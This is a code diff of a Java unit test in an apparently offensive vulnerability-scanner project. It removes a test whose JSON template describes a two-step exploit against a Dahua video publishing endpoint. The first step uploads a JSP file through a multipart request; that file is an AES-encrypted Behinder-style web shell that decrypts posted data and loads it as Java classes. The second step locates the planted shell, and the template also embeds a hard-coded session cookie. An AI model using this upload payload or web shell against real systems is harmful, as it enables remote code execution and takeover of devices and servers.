@@ -1,8 +1,5 @@
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
-import com.bcvgh.payloads.VulPocTemplateImp;
-import com.bcvgh.util.FileUtil;
-import com.bcvgh.util.JsonUtil;
 import org.junit.Test;
 
 import java.io.BufferedReader;
@@ -84,52 +81,6 @@ public class dsadas {
 //        }
     }
 
-    @Test
-    public void loadJson(){
-        String json ="{\n" +
-                "  \"num\": 2,\n" +
-                "  \"name\":\"test\",\n" +
-                "  \"tag\":\"dahua\",\n" +
-                "  \"type\":\"upload\",\n" +
-                "  \"poc\": {\n" +
-                "    \"pocGet\": \"/publishing/publishing/material/file/video\",\n" +
-                "    \"header\": {\n" +
-                "      \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
-                "      \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
-                "      \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
-                "    },\n" +
-                "    \"pattern\": \"Available SOAP\"\n" +
-                "  },\n" +
-                "  \"exp\": {\n" +
-                "    \"step1\": {\n" +
-                "      \"pocGet\": \"/publishing/publishing/material/file/video\",\n" +
-                "      \"pocPost\": \"------WebKitFormBoundaryCJEleSRxsqS0lAFv\\nContent-Disposition: form-data; name=\\\"Filedata\\\";filename=\\\"1.jsp\\\"\\n\\n<%@page import=\\\"java.util.*,javax.crypto.*,javax.crypto.spec.*\\\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\\\"POST\\\")){String k=\\\"e45e329feb5d925b\\\";/*�ƥ:ޥ�\\u000132Mmd5<�M16M\\fؤޥ�\\u0001rebeyond*/session.putValue(\\\"u\\\",k);Cipher c=Cipher.getInstance(\\\"AES\\\");c.init(2,new SecretKeySpec(k.getBytes(),\\\"AES\\\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--\",\n" +
-                "      \"header\": {\n" +
-                "        \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
-                "        \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
-                "        \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
-                "      },\n" +
-                "      \"pattern\": \"{\\\\{\\\"id\\\":[0-9]{1,3},\\\"path\\\":\\\"VIDEO/.*.jsp\\\"\\\\}}\"\n" +
-                "    },\n" +
-                "    \"step2\": {\n" +
-                "      \"pocGet\": \"/publishingImg/VIDEO/\",\n" +
-                "      \"header\": {\n" +
-                "        \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
-                "        \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
-                "        \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
-                "      },\n" +
-                "      \"pattern\": \"\"\n" +
-                "    }\n" +
-                "  }\n" +
-                "}";
-        JSONObject exp = JsonUtil.StringToJson(json);
-        JSONObject ss = exp.getJSONObject("exp");
-        for (String value:ss.keySet()){
-            System.out.println(value);
-        }
-        System.out.println(ss);
-
-    }
 
 }
 
